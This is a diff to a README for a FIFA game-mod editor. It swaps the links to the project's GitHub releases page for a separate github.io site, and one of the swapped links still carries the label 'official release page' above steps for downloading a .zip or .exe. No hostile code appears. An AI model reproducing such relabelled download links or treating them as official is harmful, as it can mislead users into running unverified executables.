@@ -1,6 +1,6 @@
 # ⚽ FIFA-All-in-One-Editor - Manage your favorite football game mods
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/gandepal6140/FIFA-All-in-One-Editor/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://gandepal6140.github.io)
 
 ## 📋 About the software
 
@@ -21,7 +21,7 @@ Ensure your computer meets these standards before you start:
 
 Follow these steps to obtain the program files.
 
-1. Go to the [official release page](https://github.com/gandepal6140/FIFA-All-in-One-Editor/releases).
+1. Go to the [official release page](https://gandepal6140.github.io).
 2. Look for the section labeled "Assets" at the bottom of the newest release entry.
 3. Click the link that ends in ".zip" or ".exe" to begin the download.
 4. Save the file to a folder you can easily find, such as your Downloads or Desktop folder.
